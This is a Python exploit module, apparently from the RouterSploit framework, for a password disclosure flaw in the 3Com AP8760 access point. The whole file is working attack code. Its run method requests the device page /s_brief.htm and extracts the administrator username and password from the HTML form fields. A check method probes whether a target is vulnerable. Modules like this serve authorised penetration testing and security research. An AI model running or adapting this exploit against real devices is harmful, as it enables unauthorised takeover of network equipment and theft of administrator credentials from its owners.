import re
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "3Com AP8760 Password Disclosure",
        "description": "Exploits 3Com AP8760 password disclosure vulnerability."
                       "If the target is vulnerable it is possible to fetch credentials for administration user.",
        "authors": (
            "Richard Brain",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "http://www.procheckup.com/procheckup-labs/pr07-40/",
        ),
        "devices": (
            "3Com AP8760",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        creds = []

        print_status("Sending payload request")
        response = self.http_request(
            method="GET",
            path="/s_brief.htm",
        )

        if response is None:
            return

        print_status("Extracting credentials")
        username = re.findall('<input type="text" name="szUsername" size=16 value="(.+?)">', response.text)
        password = re.findall('<input type="password" name="szPassword" size=16 maxlength="16" value="(.+?)">', response.text)

        if len(username) and len(password):
            print_success("Exploit success")
            creds.append((username[0], password[0]))
            print_table(("Login", "Password"), *creds)
        else:
            print_error("Exploit failed - could not extract credentials")

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/s_brief.htm",
        )
        if response is None:
            return False  # target is not vulnerable

        if "szUsername" in response.text and "szPassword" in response.text:
            return True  # target is vulnerable

        return False  # target not vulnerable
